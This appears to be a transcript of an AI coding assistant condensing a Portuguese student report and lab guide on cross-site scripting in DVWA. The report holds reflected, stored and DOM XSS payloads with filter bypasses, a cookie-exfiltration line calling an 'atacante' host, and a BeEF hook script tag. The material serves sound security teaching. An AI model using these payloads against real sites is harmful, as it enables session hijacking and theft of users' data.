+          -não a contém; *event handlers* ficam fora do filtro. **[PRINT 
+          -3]**                                                          
+       68 -                                                              
+       69 -### 5.3 Stored XSS (`xss_s`)                                  
+       70 -                                                              
+       71 -Guestbook persistente — o payload executa para **todo** visita
+          -nte. A renderização (`dvwaGuestbook`) ecoa `name` e `comment` 
+          -crus (sem codificação de saída, exceto no Impossible). Os limi
+          -tes `maxlength` (10 em `name`, 50 em `message`) são só client-
+          -side e ignorados por `curl`/DevTools.                         
+       72 -                                                              
+       73 -- **Low** — nenhuma codificação de saída (`htmlspecialchars` a
+          -usente); `<script>alert(document.cookie)</script>` no campo Me
+          -ssage persiste e executa. **[PRINT 4]**                       
+       74 -- **Medium** — Message **blindado** (`strip_tags` + `htmlspeci
+          -alchars`); o elo fraco é o campo `name`, protegido só por `str
+          -_replace('<script>', ...)`. Injeta-se `<img src=x onerror=aler
+          -t(document.cookie)>` no `name`. **[PRINT 5]**                 
+       75 -- **High** — `name` filtrado pela mesma regex anti-*script*. V
+          -etor sem a palavra *script*: `<svg/onload=alert(document.cooki
+          -e)>` (ou `<body onpageshow=...>`). **[PRINT 6]**              
+       76 -                                                              
+       77 -### 5.4 DOM-based XSS (`xss_d`)                               
+       78 -                                                              
+       79 -Type-0: *source* = `location.href`, *sink* = `document.write`.
+          - O dado nunca precisa trafegar de volta do servidor.          
+       80 -                                                              
+       63  ```javascript
+       64  var lang = location.href.substring(location.href.indexOf("defa
+           ult=")+8);
+       65  document.write("<option value='" + lang + "'>" + decodeURI(lan
+           g) + "</option>");
+       66  ```
+       67  
+       86 -- **Low** — sem filtro; `?default=<script>alert(document.cooki
+          -e)</script>` é escrito no DOM e executa. (Não reproduzível por
+          - `curl` — sink 100% client-side.) **[PRINT 7]**               
+       87 -- **Medium** — filtro server-side `stripos($default, '<script'
+          -)` redireciona. *Bypass* sem `<script>`, quebrando o contexto:
+          - `?default=</option></select><img src=x onerror=alert(document
+          -.cookie)>`. **[PRINT 8]**                                     
+       88 -- **High** — *whitelist* server-side (`French/English/German/S
+          -panish`). *Bypass* pelo **fragmento `#`**, que por especificaç
+          -ão (RFC 3986) nunca é enviado ao servidor: `?default=English#<
+          -script>alert(document.cookie)</script>`. O servidor vê só `def
+          -ault=English`; o JS lê `location.href` inteira. Defesa server-
+          -side é estruturalmente incapaz de proteger um sink que não dep
+          -ende dela — e nenhum log server-side vê o payload (relação dir
+          -eta com a meta "sem ser detectado"). **[PRINT 9]**            
+       68 +O bypass High é estrutural: o servidor vê só `default=English`
+          + (válido na whitelist), mas o JS lê `location.href` inteira, i
+          +ncluindo o fragmento `#` que, por RFC 3986, jamais alcança o s
+          +ervidor — nenhum log/WAF server-side o registra (relação diret
+          +a com a meta "sem ser detectado"). **[PRINT 3]**              
+       69  
+       90 -> **Nota:** alguns navegadores percent-encodam `<`/`>` no frag
+          -mento (`%3Cscript%3E`); como o sink usa `decodeURI()` (que não
+          - reverte `%3C`), o `alert` pode não disparar. Cole a URL diret
+          -o na barra de endereços; se necessário, valide `location.href`
+          - no Console.                                                  
+       70 +> **Nota:** alguns navegadores percent-encodam `<`/`>` no frag
+          +mento (`%3Cscript%3E`); como o sink usa `decodeURI()` (que não
+          + reverte `%3C`), o `alert` pode não disparar — cole a URL dire
+          +to na barra de endereços.                                     
+       71  
+       72  ## 6. Análise de Segurança
+       73  
+       74  ### 6.1 Interpretação e Impacto
+       75  
+       96 -Todos os vetores levam ao mesmo resultado: **execução de JavaS
+          -cript arbitrário na origem do DVWA com a sessão da vítima**. C
+          -enários de impacto:                                           
+       76 +Todos os vetores levam ao mesmo resultado: **execução de JavaS
+          +cript arbitrário na origem do DVWA com a sessão da vítima**. O
+          +s principais impactos:                                        
+       77  
+       98 -- **Roubo de cookie / sequestro de sessão:** `new Image().src=
+          -'http://atacante/c?'+document.cookie` exfiltra o `PHPSESSID`; 
+          -o atacante reimporta o cookie e assume a sessão autenticada se
+          -m senha.                                                      
+       99 -- **Keylogging:** captura de teclas em formulários de login vi
+          -a `addEventListener('keydown', ...)`.                         
+      100 -- **Defacement / phishing:** reescrita do DOM e injeção de log
+          -in falso sobre o domínio legítimo (com HTTPS válido).         
+      101 -- **Propagação (worm):** no Stored, o payload persiste e execu
+          -ta para todo visitante, podendo se auto-replicar.             
+      102 -- **Ações forjadas (XSS + CSRF):** rodando no contexto autenti
+          -cado, o script lê o próprio token CSRF da página antes de subm
+          -eter requisições privilegiadas.                               
+       78 +- **Roubo de cookie / sequestro de sessão:** `new Image().src=
+          +'http://atacante/c?'+document.cookie` exfiltra o `PHPSESSID`; 
+          +o atacante reimporta o cookie e assume a sessão sem senha.    
+       79 +- **Defacement / phishing:** reescrita do DOM e injeção de log
+          +in falso sobre o domínio legítimo (com HTTPS válido); *keylogg
+          +ing* via `addEventListener`.                                  
+       80 +- **Propagação (worm):** no Stored o payload persiste e execut
+          +a para todo visitante, podendo se auto-replicar.              
+       81 +- **Ações forjadas (XSS + CSRF):** no contexto autenticado, o 
+          +script lê o próprio token CSRF da página antes de submeter req
+          +uisições privilegiadas.                                       
+       82  
+      104 -A lição transversal: **blacklists são insuficientes por constr
+          -ução** — `str_replace` cai com variação de caixa, tag alternat
+          -iva ou aninhamento; a regex anti-*script* ignora todo o univer
+          -so de *event handlers*; e filtros server-side são impotentes c
+          -ontra DOM XSS via fragmento.                                  
+       83 +A lição transversal: **blacklists são insuficientes por constr
+          +ução** — caem com variação de caixa, tag alternativa, aninhame
+          +nto ou event handlers, e são impotentes contra DOM XSS via fra
+          +gmento. Demonstração de impacto com **BeEF**: a partir do Stor
+          +ed Low injeta-se o *hook* (`<script src="http://<IP>:3000/hook
+          +.js"></script>`, via `curl` para furar o `maxlength`); o naveg
+          +ador-vítima aparece *hooked* no painel e o módulo *Get Cookies
+          +* captura a sessão — viável apenas pela ausência de encoding, 
+          +CSP e flag `HttpOnly`.                                        
+       84  
+       85  ### 6.2 Mitigações
+       86  
+       87  | Mitigação | Função |
+       88  |---|---|
+      110 -| **Output encoding contextual** | Defesa primária. Codificar 
+          -a saída conforme o contexto (HTML, atributo, JS, URL). `htmlsp
+          -ecialchars()` converte `< > " & '` em entidades, neutralizando
+          - o payload. |                                                 
+      111 -| **Validação por allowlist** | Aceitar apenas valores/formato
+          -s esperados. Complementa, não substitui, o encoding. |        
+      112 -| **Content Security Policy** | CSP estrita com `nonce` por re
+          -quisição (`script-src 'nonce-…' 'strict-dynamic'`), sem `unsaf
+          -e-inline`. Defesa em profundidade. |                          
+      113 -| **Trusted Types** | `require-trusted-types-for 'script'` for
+          -ça sinks perigosos (`innerHTML`, `document.write`) a rejeitar 
+          -strings cruas — elimina classes de DOM XSS. |                 
+      114 -| **DOMPurify** | Sanitização de HTML rico onde o encoding que
+          -braria a funcionalidade. |                                    
+      115 -| **HttpOnly / Secure / SameSite** | `HttpOnly` impede a leitu
+          -ra via `document.cookie`, neutralizando o roubo direto de sess
+          -ão. |                                                         
+       89 +| **Output encoding contextual** | Defesa primária. `htmlspeci
+          +alchars()` converte `< > " & '` em entidades conforme o contex
+          +to (HTML, atributo, JS, URL). |                               
+       90 +| **Validação por allowlist** | Aceita apenas valores/formatos
+          + esperados; complementa o encoding. |                         
+       91 +| **Content Security Policy** | CSP estrita com `nonce` por re
+          +quisição, sem `unsafe-inline`. Defesa em profundidade. |      
+       92 +| **Trusted Types** | Força sinks perigosos (`innerHTML`, `doc
+          +ument.write`) a rejeitar strings cruas; elimina classes de DOM
+          + XSS. |                                                       
+       93 +| **HttpOnly / Secure / SameSite** | `HttpOnly` impede leitura
+          + via `document.cookie`, neutralizando o roubo direto de sessão
+          +. |                                                           
+       94  
+      117 -### 6.3 O Nível Impossible como Referência                    
+       95 +O nível **Impossible** materializa a correção: aplica `htmlspe
+          +cialchars()` na entrada e na renderização (a `dvwaGuestbook` s
+          +ó codifica nesse nível) + **token anti-CSRF**; no DOM, remove 
+          +o `decodeURI()` do sink, fazendo o `%3Cscript%3E` chegar ao `d
+          +ocument.write` como texto literal.                            
+       96  
+      119 -O Impossible abandona a *blacklist* e adota **encoding de saíd
+          -a sensível ao contexto**, robusto por não depender de prever c
+          -ada vetor. Em **Reflected/Stored**, aplica `htmlspecialchars()
+          -` na entrada e na renderização (a `dvwaGuestbook` só codifica 
+          -quando o nível é Impossible), tornando qualquer tag texto iner
+          -te, somado a um **token anti-CSRF**. Em **DOM**, a correção é 
+          -client-side: remove-se o `decodeURI()` do sink, de modo que o 
+          -`%3Cscript%3E` chega ao `document.write` sem ser decodificado,
+          - tratado como texto literal.                                  
+      120 -                                                              
+      121 -### 6.4 Demonstração de Impacto com BeEF                      
+      122 -                                                              
+      123 -A partir do Stored XSS (Low) injeta-se o *hook* do BeEF (`<scr
+          -ipt src="http://<IP>:3000/hook.js"></script>`, contornando o `
+          -maxlength` via `curl`). Ao abrir o guestbook, o navegador-víti
+          -ma aparece como *hooked* no painel e o módulo *Host → Get Cook
+          -ies* captura a sessão — demonstrando que o impacto só é possív
+          -el pela ausência de output encoding, CSP e flag `HttpOnly`. (P
+          -rocedimento completo no guia operacional; uso restrito a este 
+          -laboratório autorizado.)                                      
+      124 -                                                              
+       97  ## 7. Conclusão
+       98  
+      127 -A análise confirmou XSS exploável nos três módulos (Reflected,
+          - Stored, DOM-based) em todos os níveis Low, Medium e High, com
+          - progressão didática clara: a **ausência de filtro** (Low) dá 
+          -lugar a **blacklists ingênuas** (Medium/High), contornadas com
+          - vetores triviais — tags alternativas, *event handlers*, varia
+          -ção de caixa, aninhamento e, no DOM, o fragmento de URL que ja
+          -mais alcança o servidor.                                      
+       99 +A análise confirmou XSS exploável nos três módulos (Reflected,
+          + Stored, DOM-based) em todos os níveis Low/Medium/High, com pr
+          +ogressão didática clara: a **ausência de filtro** (Low) dá lug
+          +ar a **blacklists ingênuas** (Medium/High) contornadas com vet
+          +ores triviais — tags alternativas, event handlers, variação de
+          + caixa e, no DOM, o fragmento de URL que jamais alcança o serv
+          +idor.                                                         
+      100  
+      129 -O aprendizado central é conceitual: defender-se de XSS **não**
+          - é enumerar e remover o que parece perigoso, mas **codificar t
+          -oda saída conforme seu contexto**, tratando entrada como dado.
+          - O nível Impossible materializa essa virada e serve de referên
+          -cia de código seguro por padrão, idealmente reforçado por CSP 
+          -estrita, Trusted Types e cookies `HttpOnly/SameSite`. Como lim
+          -itação, o DVWA é propositalmente simplificado (sinks diretos, 
+          -provas com `alert()` em vez de exfiltração real), mas a mecâni
+          -ca de exploração e de defesa é diretamente transponível para p
+          -rodução.                                                      
+      101 +O aprendizado central é conceitual: defender-se de XSS **não**
+          + é enumerar e remover o que parece perigoso, mas **codificar t
+          +oda saída conforme seu contexto**, tratando entrada como dado.
+          + O nível Impossible exemplifica essa virada e serve de referên
+          +cia de código seguro por padrão, idealmente reforçado por CSP 
+          +estrita, Trusted Types e cookies `HttpOnly/SameSite`. O DVWA é
+          + propositalmente simplificado (provas com `alert()`), mas a me
+          +cânica de exploração e de defesa é diretamente transponível pa
+          +ra produção.                                                  
+      102  
+      103  ### Referências
+      104  
+      105  - OWASP — XSS Prevention Cheat Sheet: https://cheatsheetseries
+           .owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_S
+           heet.html
+      106  - OWASP — DOM-based XSS Prevention Cheat Sheet: https://cheats
+           heetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Chea
+           t_Sheet.html
+      135 -- MDN — Content Security Policy (CSP): https://developer.mozil
+          -la.org/en-US/docs/Web/HTTP/Guides/CSP                         
+      107 +- MDN — Content Security Policy: https://developer.mozilla.org
+          +/en-US/docs/Web/HTTP/Guides/CSP                               
+      108  - MDN — Trusted Types API: https://developer.mozilla.org/en-US
+           /docs/Web/API/Trusted_Types_API
+      137 -- DOMPurify: https://github.com/cure53/DOMPurify              
+      109  - BeEF Project: https://beefproject.com/
+
+● Agora alinho a tabela de mapeamento do passo a passo ao esquema de 3 prints
+  compostos e meço o relatório final:
+
+● PowerShell($f='C:\www\DVWA\relatorio-xss-dvwa.md'
+            $t=Get-Content -Raw $f…)
+  ⎿  relatorio final: 9234 chars, 110 linhas (original 18187 / 262)
+     reducao total: 49%
+
+● Relatório final: 49% menor (262→110 linhas, ~5,6 págs de texto + 3 prints ≈
+  ~6,5 págs). Folga confortável.
+
+  Ajustando a tabela de mapeamento do passo a passo pro esquema de 3 prints
+  compostos:
+
+  Read 1 file (ctrl+o to expand)
+● Update(passo-a-passo-xss-dvwa.md)
+  ⎿  Added 11 lines, removed 13 lines
+      468  
+      469  ---
+      470  
+      471 -## 8. Tabela Final de Mapeamento — PRINT → Seção do Relatório 
+      471 +## 8. Tabela Final de Mapeamento — Capturas → PRINT do Relatór
+          +io                                                            
+      472  
+      473 -| PRINT | Cenário | Nível | Tipo | Evidência-chave | Seção sug
+          -erida do relatório |                                          
+      474 -|-------|---------|-------|------|-----------------|----------
+          ---------------------|                                         
+      475 -| PRINT 1 | Cenário 1 | Low | Reflected | `alert(document.cook
+          -ie)` via `<script>` na URL | Reflected XSS — Análise nível Low
+          - |                                                            
+      476 -| PRINT 2 | Cenário 2 | Medium | Reflected | `onerror` do `<im
+          -g>` + bypass aninhado | Reflected XSS — Bypass de blacklist (M
+          -edium) |                                                      
+      477 -| PRINT 3 | Cenário 3 | High | Reflected | `onload` do `<svg>`
+          - + regex que só pega `script` | Reflected XSS — Bypass de rege
+          -x (High) |                                                    
+      478 -| PRINT 4 | Cenário 4 | Low | Stored | `<script>` persistido n
+          -o guestbook | Stored XSS — Persistência nível Low |           
+      479 -| PRINT 5 | Cenário 5 | Medium | Stored | `<img onerror>` no c
+          -ampo Name | Stored XSS — Bypass de `str_replace` (Medium) |   
+      480 -| PRINT 6 | Cenário 6 | High | Stored | `<svg/onload>` no camp
+          -o Name | Stored XSS — Bypass de `preg_replace` (High) |       
+      481 -| PRINT 7 | Cenário 7 | Low | DOM | `document.write` injeta `<
+          -script>` | DOM XSS — Sink client-side (Low) |                 
+      482 -| PRINT 8 | Cenário 8 | Medium | DOM | Quebra de contexto `</o
+          -ption></select>` + `<img>` | DOM XSS — Bypass de `stripos` (Me
+          -dium) |                                                       
+      483 -| PRINT 9 | Cenário 9 | High | DOM | Fragmento `#` contorna wh
+          -itelist server-side | DOM XSS — Bypass via fragmento (High) | 
+      484 -| (BeEF) | Seção 7 | Low | Stored→BeEF | Browser hooked + Get 
+          -Cookies + hijack | Impacto — Demonstração com BeEF |          
+      473 +> **Economia de páginas:** capture os 9 cenários individualmen
+          +te, mas **monte 3 imagens compostas** (uma por tipo, com os 3 
+          +níveis lado a lado) para o relatório. O relatório usa apenas `
+          +[PRINT 1]`, `[PRINT 2]` e `[PRINT 3]`.                        
+      474  
+      475 +| PRINT (relatório) | Capturas a montar | Tipo | Evidência-cha
+          +ve | Seção do relatório |                                     
+      476 +|---|---|---|---|---|                                         
+      477 +| **[PRINT 1]** | Cenários 1+2+3 (Low/Medium/High) | Reflected
+          + | `alert(document.cookie)` via `<script>`, `<img onerror>` e 
+          +`<svg onload>` | 5 — Reflected (`xss_r`) |                    
+      478 +| **[PRINT 2]** | Cenários 4+5+6 (Low/Medium/High) | Stored | 
+          +`<script>` persistido + `<img>`/`<svg>` no campo Name | 5 — St
+          +ored (`xss_s`) |                                              
+      479 +| **[PRINT 3]** | Cenários 7+8+9 (Low/Medium/High) | DOM | `do
+          +cument.write`, quebra de contexto e fragmento `#` | 5 — DOM-ba
+          +sed (`xss_d`) |                                               
+      480 +| (opcional) | Seção 7 (BeEF) | Stored→BeEF | Browser hooked +
+          + Get Cookies + hijack | 6.1 — Impacto (BeEF) |                
+      481 +                                                              
+      482 +> Os marcadores `[PRINT 1..9]` nos cenários acima indicam **o 
+          +que capturar em cada passo**; eles se consolidam nos 3 prints 
+          +compostos da tabela. A captura da Seção 7 (BeEF) é opcional e 
+          +reforça a seção de impacto.                                   
+      483 +                                                              
+      484  ---
+      485  
+      486  > **Higiene do laboratório:** ao final, limpe o guestbook (bot
+           ão **Clear Guestbook** ou reset do banco na página Setup) e re
+           torne o nível para `Impossible` para evidenciar a mitigação co
+           rreta. No DVWA, o nível `Impossible` combina **três defesas XS
+           S**: (1) **codificação de saída** com `htmlspecialchars()` apl
+           icada tanto na entrada quanto na renderização dos campos; (2) 
+           **token anti-CSRF** validado a cada submissão; e (3) no DOM, *
+           *remoção do `decodeURI`** (a whitelist passa a tratar o valor 
+           já codificado, sem revertê-lo). Esse conjunto neutraliza Refle
+           cted, Stored e DOM XSS — sem necessidade de citar mecanismos f
+           ora do escopo de XSS.
+      487   No newline at end of file
+
+● Pronto. Ambos arquivos atualizados e consistentes.
+
+  Resultado final
+
+  relatorio-xss-dvwa.md — 49% menor (262→110 linhas). 8 seções exigidas
+  intactas, payloads corretos, zero menção a SQL/PDO.
+  - Subseções 5.2/5.3/5.4 fundidas na matriz "Por que o filtro falha" + 1
+  parágrafo analítico por tipo (mantém a profundidade que é avaliada)
+  - 6.4 BeEF fundido em 6.1; Anexos A/B cortados (estão no passo a passo)
+  - 9 prints → 3 compostos ([PRINT 1] Reflected, [PRINT 2] Stored, [PRINT 3]
+  DOM)
+  - Padronizado alert(document.cookie)
+
+  Projeção: ~5,6 págs de texto + 3 prints ≈ ~6,5 páginas (limite 8). Folga
+  garantida.
+
+  passo-a-passo-xss-dvwa.md — tabela de mapeamento agora faz a ponte: capture os
+  9 cenários, monte em 3 imagens compostas (3 níveis lado a lado). Marcadores
+  inline [PRINT 1..9] viram "o que capturar em cada passo".
+
+  Pra fechar
+
+  1. Capa: trocar [PREENCHER].
+  2. Capturar 9 alerts → montar 3 prints compostos (níveis lado a lado, cropados
+  apertado).
+  3. Converter MD→docx ou colar no Google Docs.
+  4. Conferir no Docs depois de inserir os 3 prints — se ainda apertar, encolhe
+  as imagens ou tira o print opcional do BeEF.
+
+  Quer que eu rode os curl ao vivo (Docker tá de pé) pra gerar evidência textual
+  real da reflexão/persistência, como apoio aos prints?
+
+✻ Cogitated for 5m 35s
+
+❯ @"4 - DVWA e Cross-Site Scripting (XSS).docx.md" use o padrão de documento    
+  que está definido na atividade                                                
+  ⎿  Read 4 - DVWA e Cross-Site Scripting (XSS).docx.md (48 lines)
+  ⎿  ⧉ Selected 138 lines from relatorio-xss-dvwa.md in Visual Studio Code
+
+● Entendi — alinhar o relatório ao padrão de documento definido na atividade:
+  capa obrigatória com identificação dos integrantes + as 7 seções com os
+  nomes/ordem exatos que o professor listou (Introdução, Objetivos da Análise,
+  Ferramentas Utilizadas, Metodologia Aplicada, Resultados Obtidos, Análise de
+  Segurança, Conclusão).
+
+  Meus títulos já batem nos nomes; vou montar uma capa formal completa e
+  garantir aderência literal. Inferi a instituição UNIJUÍ pelo domínio do e-mail
+  do professor (unijui.edu.br) — ajuste se for outro campus/curso.
+
+● Write(relatorio-xss-dvwa.md)
+  ⎿  Added 54 lines, removed 41 lines
+       1 -# Análise de Segurança — Cross-Site Scripting (XSS) no DVWA    
+       1 +# Capa                                                         
+       2  
+       3 -## Capa                                                        
+       3 +UNIVERSIDADE REGIONAL DO NOROESTE DO ESTADO DO RIO GRANDE DO SU
+         +L — UNIJUÍ                                                     
+       4  
+       5 -**Análise Técnica de Vulnerabilidades Cross-Site Scripting (XSS
+         -) em Aplicação Web — Estudo de Caso com DVWA**                 
+       5 +Curso: [PREENCHER]                                             
+       6  
+       7 -**Integrantes do grupo:** [PREENCHER]                          
+       7 +Disciplina: **Segurança de Dados**                             
+       8  
+       9 -**Disciplina:** Segurança de Dados                             
+       9 +Atividade: **Ferramentas de testes de intrusão (pentest)**     
+      10  
+      11 -**Professor:** Tiago Mallmann Rohde                            
+      11 +---                                                            
+      12  
+      13 -**Data:** 15/06/2026                                           
+      13 +**DVWA e Cross-Site Scripting (XSS): Exploração Controlada e An
+         +álise de Segurança**                                           
+      14  
+      15  ---
+      16  
+      17 -## 1. Introdução                                               
+      17 +Integrantes do grupo:                                          
+      18  
+      19 -Este relatório documenta uma atividade de *pentest* sobre a apl
+         -icação **DVWA** (Damn Vulnerable Web Application), ambiente web
+         - propositalmente vulnerável usado para fins didáticos. O foco e
+         -xclusivo foi **Cross-Site Scripting (XSS)** — falha que ocorre 
+         -quando a aplicação incorpora dados do usuário na resposta sem v
+         -alidação ou codificação adequada, permitindo a execução de Java
+         -Script arbitrário no navegador da vítima. É uma das falhas mais
+         - persistentes em aplicações web (histórico no OWASP Top 10) por
+         - derivar de um erro conceitual simples: tratar **entrada do usu
+         -ário como código** em vez de **dado**. O ambiente roda em Docke
+         -r, exposto em `http://localhost:4280` (bind `127.0.0.1`, isolad
+         -o), com níveis de segurança ajustáveis (Low, Medium, High, Impo
+         -ssible) na aba *DVWA Security*.                                
+      19 +- [NOME COMPLETO — MATRÍCULA]                                  
+      20 +- [NOME COMPLETO — MATRÍCULA]                                  
+      21 +- [NOME COMPLETO — MATRÍCULA]                                  
+      22  
+      21 -## 2. Objetivos da Análise                                     
+      23 +Professor: Tiago Mallmann Rohde                                
+      24  
+      25 +Ijuí – RS, 2026                                                
+      26 +                                                               
+      27 +---                                                            
+      28 +<!-- QUEBRA DE PÁGINA APÓS A CAPA -->                          
+      29 +                                                               
+      30 +# Introdução                                                   
+      31 +                                                               
+      32 +Este relatório documenta uma atividade de teste de intrusão (*p
+         +entest*) em aplicação web vulnerável, realizada em ambiente con
+         +trolado sobre a aplicação **DVWA** (Damn Vulnerable Web Applica
+         +tion). O foco é exclusivamente a exploração de **Cross-Site Scr
+         +ipting (XSS)** e sua relevância para a compreensão de falhas de
+         + validação de entrada e execução de código no contexto do naveg
+         +ador.                                                          
+      33 +                                                               
+      34 +O XSS ocorre quando a aplicação incorpora dados controlados pel
+         +o usuário na resposta sem validação ou codificação adequada, pe
+         +rmitindo a execução de JavaScript arbitrário no navegador da ví
+         +tima. É uma das falhas mais persistentes em aplicações web (his
+         +tórico no OWASP Top 10) por derivar de um erro conceitual simpl
+         +es: tratar **entrada do usuário como código** em vez de **dado*
+         +*. O ambiente analisado roda em Docker, exposto em `http://loca
+         +lhost:4280` (bind `127.0.0.1`, isolado), com níveis de seguranç
+         +a ajustáveis (Low, Medium, High, Impossible) na aba *DVWA Secur
+         +ity*.                                                          
+      35 +                                                               
+      36 +# Objetivos da Análise                                         
+      37 +                                                               
+      38  - **Identificar** os pontos vulneráveis a XSS nos três módulos:
+           Reflected (`xss_r`), Stored (`xss_s`) e DOM-based (`xss_d`).
+      24 -- **Compreender** como cada nível tenta (e falha em) filtrar pa
+         -yloads.                                                        
+      25 -- **Avaliar** o impacto da execução de scripts no client-side —
+         - roubo de cookies, sequestro de sessão e ações autenticadas for
+         -jadas.                                                         
+      26 -- **Contrastar** defesas por *blacklist* (Medium/High) com *out
+         -put encoding* contextual (Impossible).                         
+      39 +- **Compreender** o comportamento da interface diante de entrad
+         +as maliciosas e como cada nível tenta (e falha em) filtrar payl
+         +oads.                                                          
+      40 +- **Avaliar** o impacto potencial da execução de scripts no lad
+         +o do cliente — roubo de cookies, sequestro de sessão e ações au
+         +tenticadas forjadas.                                           
+      41 +- **Contrastar** defesas por *blacklist* (Medium/High) com a ab
+         +ordagem correta de *output encoding* contextual (Impossible).  
+      42  
+      28 -## 3. Ferramentas Utilizadas                                   
+      43 +# Ferramentas Utilizadas                                       
+      44  
+      30 -| Ferramenta | Uso |                                           
+      45 +| Ferramenta | Uso na atividade |                              
+      46  |---|---|
+      32 -| **DVWA** (Docker, `localhost:4280`) | Aplicação-alvo vulneráv
+         -el, níveis ajustáveis. |                                       
+      33 -| **Navegador + DevTools** | Submissão de payloads; inspeção do
+         - DOM e das requisições. |                                      
+      34 -| **curl** | Evidência da reflexão/persistência no HTML; *bypas
+         -s* de `maxlength` (só client-side). |                          
+      35 -| **BeEF** (porta 3000) | Demonstração de impacto pós-exploraçã
+         -o (*hook* e captura de cookies). |                             
+      47 +| **DVWA** (Docker, `localhost:4280`) | Ambiente vulnerável de 
+         +testes, com níveis de segurança ajustáveis. |                  
+      48 +| **Navegador web + DevTools** | Submissão de payloads; inspeçã
+         +o do DOM e das requisições. |                                  
+      49 +| **curl** | Evidência da reflexão/persistência no HTML; *bypas
+         +s* de `maxlength` (validação apenas client-side). |            
+      50 +| **BeEF** (porta 3000) | Demonstração de impacto pós-exploraçã
+         +o (*hook* do navegador e captura de cookies). |                
+      51  
+      37 -## 4. Metodologia Aplicada                                     
+      52 +# Metodologia Aplicada                                         
+      53  
+      39 -Exploração **manual, incremental e controlada**, evitando autom
+         -ação massiva. Para cada tipo percorreu-se **Low → Medium → High
+         -**: (1) leitura do código-fonte do nível para entender a barrei
+         -ra; (2) construção do *payload* mínimo capaz de contorná-la; (3
+         -) submissão via URL, formulário ou `curl`; (4) observação do ef
+         -eito no cliente. O critério foi **orientado a impacto** (`docum
+         -ent.cookie`). O nível **Impossible** serviu de referência de co
+         -rreção, não de alvo. Comandos `curl` reprodutíveis e o procedim
+         -ento BeEF constam no guia operacional anexo.                   
+      54 +A exploração foi conduzida de forma **manual, controlada e incr
+         +emental**, evitando automação massiva ou técnicas agressivas (e
+         +xplorar sem ser detectado). Para cada tipo de XSS percorreu-se 
+         +a progressão **Low → Medium → High**: (1) leitura do código-fon
+         +te do nível para entender a barreira de defesa; (2) construção 
+         +do *payload* mínimo capaz de contorná-la; (3) inserção via URL,
+         + formulário ou `curl`; (4) observação do comportamento no naveg
+         +ador e registro da evidência. O critério foi **orientado à anál
+         +ise de impacto** (demonstração de `document.cookie`). O nível *
+         +*Impossible** foi analisado como referência de correção, não co
+         +mo alvo de exploração. Os comandos `curl` reprodutíveis e o pro
+         +cedimento BeEF estão detalhados no guia operacional que acompan
+         +ha esta atividade.                                             
+      55  
+      41 -## 5. Resultados Obtidos                                       
+      56 +# Resultados Obtidos                                           
+      57  
+      43 -Confirmou-se XSS exploável nos três módulos em **todos** os nív
+         -eis Low, Medium e High.                                        
+      58 +Confirmou-se XSS exploável nos três módulos em **todos** os nív
+         +eis Low, Medium e High. A tabela consolida os payloads e o moti
+         +vo da falha de cada filtro.                                    
+      59  
+      45 -| Tipo | Nível | Payload | Por que o filtro falha |            
+      60 +| Tipo | Nível | Payload utilizado | Por que o filtro falha |  
+      61  |---|---|---|---|
+      62  | Reflected | Low | `<script>alert(document.cookie)</script>` |
+           Sem filtro; concatenado cru em `<pre>`. |
+      63  | Reflected | Medium | `<img src=x onerror=alert(document.cooki
+          e)>` | `str_replace('<script>')` é literal/case-sensitive; `<im
+          g>` não o contém. |
+     ...
+      69  | DOM | Medium | `?default=</option></select><img src=x onerror
+          =alert(document.cookie)>` | `stripos('<script')` não vê `<img>`
+          ; quebra o contexto `<select>`. |
+      70  | DOM | High | `?default=English#<script>alert(document.cookie)
+          </script>` | Fragmento `#` não vai ao servidor; sink lê `locati
+          on.href`. |
+      71  
+      57 -**Reflected (`xss_r`)** — o GET `name` é refletido em `<pre>Hel
+         -lo {name}</pre>`, sem codificação. A progressão evidencia a fal
+         -ência da *blacklist*: o `header X-XSS-Protection: 0` desliga o 
+         -filtro legado (Low); `<img onerror>` escapa do `str_replace` li
+         -teral (Medium); `<svg/onload>` escapa da regex que só busca a p
+         -alavra *script* (High). **[PRINT 1]**                          
+      72 +**Reflected (`xss_r`)** — o parâmetro GET `name` é refletido em
+         + `<pre>Hello {name}</pre>`, sem codificação de saída. A progres
+         +são evidencia a falência da *blacklist*: o `header X-XSS-Protec
+         +tion: 0` desliga o filtro legado (Low); `<img onerror>` escapa 
+         +do `str_replace` literal (Medium); `<svg/onload>` escapa da reg
+         +ex que só busca a palavra *script* (High). **[PRINT 1]**       
+      73  
+      59 -**Stored (`xss_s`)** — guestbook persistente; o payload executa
+         - para **todo** visitante. A renderização (`dvwaGuestbook`) ecoa
+         - `name`/`comment` crus (codifica só no Impossible). O Message é
+         - blindado em Medium/High (`strip_tags`+`htmlspecialchars`), ent
+         -ão o campo `name` é o elo fraco. Os limites `maxlength` (10/50)
+         - são só client-side e ignorados por `curl`/DevTools. **[PRINT 2
+         -]**                                                            
+      74 +**Stored (`xss_s`)** — guestbook persistente; o payload executa
+         + para **todo** visitante. A renderização (`dvwaGuestbook`) ecoa
+         + `name`/`comment` crus (codifica apenas no Impossible). O campo
+         + Message é blindado em Medium/High (`strip_tags` + `htmlspecial
+         +chars`), tornando o campo `name` o elo fraco. Os limites `maxle
+         +ngth` (10/50) são apenas client-side e ignorados por `curl`/Dev
+         +Tools. **[PRINT 2]**                                           
+      75  
+      76  **DOM-based (`xss_d`)** — Type-0: *source* = `location.href`, *
+          sink* = `document.write`; o dado nunca trafega de volta ao serv
+          idor.
+      77  
+     ...
+       80  document.write("<option value='" + lang + "'>" + decodeURI(lan
+           g) + "</option>");
+       81  ```
+       82  
+       68 -O bypass High é estrutural: o servidor vê só `default=English`
+          - (válido na whitelist), mas o JS lê `location.href` inteira, i
+          -ncluindo o fragmento `#` que, por RFC 3986, jamais alcança o s
+          -ervidor — nenhum log/WAF server-side o registra (relação diret
+          -a com a meta "sem ser detectado"). **[PRINT 3]**              
+       83 +O *bypass* High é estrutural: o servidor vê apenas `default=En
+          +glish` (válido na whitelist), mas o JavaScript lê `location.hr
+          +ef` inteira, incluindo o fragmento `#` que, por RFC 3986, jama
+          +is alcança o servidor — nenhum log/WAF server-side o registra 
+          +(relação direta com a meta de "explorar sem ser detectado"). *
+          +*[PRINT 3]**                                                  
+       84  
+       70 -> **Nota:** alguns navegadores percent-encodam `<`/`>` no frag
+          -mento (`%3Cscript%3E`); como o sink usa `decodeURI()` (que não
+          - reverte `%3C`), o `alert` pode não disparar — cole a URL dire
+          -to na barra de endereços.                                     
+       85 +> **Nota:** alguns navegadores percent-encodam `<`/`>` no frag
